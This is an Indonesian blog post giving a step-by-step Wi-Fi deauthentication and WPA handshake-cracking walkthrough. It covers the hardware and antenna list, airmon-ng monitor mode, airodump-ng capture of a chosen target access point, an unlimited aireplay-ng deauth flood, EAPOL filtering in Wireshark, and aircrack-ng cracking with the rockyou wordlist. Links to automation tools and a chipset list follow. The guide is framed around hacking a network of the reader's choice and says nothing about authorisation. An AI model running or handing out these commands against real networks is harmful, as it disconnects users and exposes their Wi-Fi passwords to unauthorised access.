---
layout: post
title: Wi-Fi hacking deauthentication attack
date: 2021-05-06 05:24
category: Hacking
author: irfnrdh
tags: []
summary: 
---

## Pengenalan Dasar deauthentication attack
- https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack
- https://www.aircrack-ng.org/doku.php?id=deauthentication
- https://www.google.com/search?q=deauth+attack

## Kebutuhan :
- VMWare [Link Download](https://www.google.com/search?q=VMware+Download+full)
- Kali Linux VMware Version [Link Download](https://www.kali.org/downloads/)
- Alfa AWUSO36NH/A = Rp660.000  [Link Pembelian](https://www.tokopedia.com/search?st=product&q=Alfa%20AWUSO36NHA&navsource=kodekeras.my.id)
  Tambahan Antena:
  - Antenna yang lebih besar:
  - Panel 7dB,
  - Radar 8dB,
  - Omni 9dB,
  - Panel indoor 10dB,
  - Yagi 16dB
  - Panel 19dB (butuh kabel pigtail)
  - Grid 24dB (butuh kabel pigtail)
  - Kabel USB Extender 10 meter
  - Router ALFA R36  
> Kamu bebas!. Bisa pakai cara lain yang disuka selain dengan virtual dengan VMware

## Aksi :

### 1. Melihat Versi Kali Linux
```
cat /etc/os-release
uname -a
```

### 2. Melihat Netwok Interface yang ada
```
ip addr
iwconfig
```

### 3. Memberhentikan proses yang ada
```
sudo airmon-ng check kill
```

### 4. Memulai Mode Monitoring Jaringan
```
sudo airmon-ng start wlan0
```

### 5. Memverifikasi mode monitor yang digunakan
```
sudo airmon-ng 
```

### 6. Bisa juga menggunakan iwconfig untukj mengecek interface mode monitornya
```
iwconfig
```

### 7. Mendapatkan Akses Point MAC Address dan channel
```
sudo airodump-ng wlan0mon
``` 

### 8. Pilih AP-MAC & channel sesuai dengan wifi yang ingin di hack
```
Contoh 
ESSID: 90:9A:4A:B8:F3:FB
Channel used by AP for SSID: 2
```

### 9. Buka dua tab jendela, tab pertama 
Pastikan sudah menggantikan nomor channel dan bssid sesuai dengan pilihan
kamu bisa ganti kata hack1 dengan nama file sesuka kamu seperti tangkapan1 atau lainnya
```
sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon
```

### 10. Pada tab jendela kedua, lakukan deauth attack
Pastikan kamu sudah menggantikan bssidnya dengan punya kamu
```
sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon
```
### 12. Gunakan Wireshark untuk membuka file hasil monitor
```
wireshark hack1-01.cap
```
### 13. Lalukan filtering pada wireshark untuk kata "EAPOL"
```
eapol
```

### 14. Hentikan Monitor Modenya 
```
airmon-ng stop wlan0mon
``` 

### 15. Crack the code
Langkah terakhir adalah crack file dengan rockyou ataupun wordlist lainnya
pastikan kamu sudah ada rockyou dengan format .txt bukan dalam kompresan 
```
aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt 
```

## Selamat Mencoba!
jika langkah ini terlalu panjang, kamu bisa gunakan automation dengan coding!
<script src="https://gist.github.com/irfnrdh/7a9fdb5b15649af356f0884f90db4be7.js"></script>
[Uji Coba versi keduanya!](https://github.com/derv82/wifite2)

## Update Perangkat yang Support

Lainnya : fluxion, wifiphiser, airgeddon, wirespy, rogue, esp8266_deauther

- https://www.kalilinux.in/2020/07/wifi-adapter-kali-linux-2020.html
- https://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles.html
- https://www.wirelesshack.org/best-usb-wireless-network-adapters.html
- https://tuxurbanjournal.wordpress.com
- http://ueu6165.weblog.esaunggul.ac.id/
- https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards%20and%20Chipsets

Chip 	  : Atheros AR9271
Interface : USB
Standard  : IEEE 802.11 b/g/n
Speed     : up to 150 Mbps

TP Link TL WN722N version 1 

Supports 
1. Monitor mode / promiscuous mode 
2. packet injection 

on Kali Linux, Parrot Security even in RPi.

Most Chipset Work:
- Atheros AR9271 (paling disukai & sayang only supports 2.4 GHz).
- Ralink RT3070.
- Ralink RT3572.
- Ralink RT5370N
- Ralink RT5372.
- Ralink RT5572.
- RealTek 8187L (Wireless G adapters)
- RealTek RTL8812AU (RTL8812BU & Realtek8811AU doesn’t support monitor mode).
- RealTek RTL8814AU

check chipset `$ lsusb`

Supports security protocols: 64/128-bit wep, wpa, wpa2, tkip, aes

1. Alfa AWUS036NH (Atheros AR 9271) Good Old Friend
2. Alfa AWUS036NHA (Ralink RT 3070) Best in it’s Price Range
3. Alfa AWUS036NEH (Ralink RT 3070) Compact and Portable
4. Panda PAU09 N600 (Ralink RT5572) Stylish for the Beginners
5. Alfa AWUS036ACH (RealTek RTL8812AU) Smart Look & Advanced
6. Alfa AC1900 (RealTek RTL8814AU) Powerful & Premium
7. Panda PAU 06 (Ralink RT5372) Chip, Single Band
8. USB Adapter 802.11N 150Mbps MediaTek 7601 (sering bermasalah)


https://thezoo.morirt.com
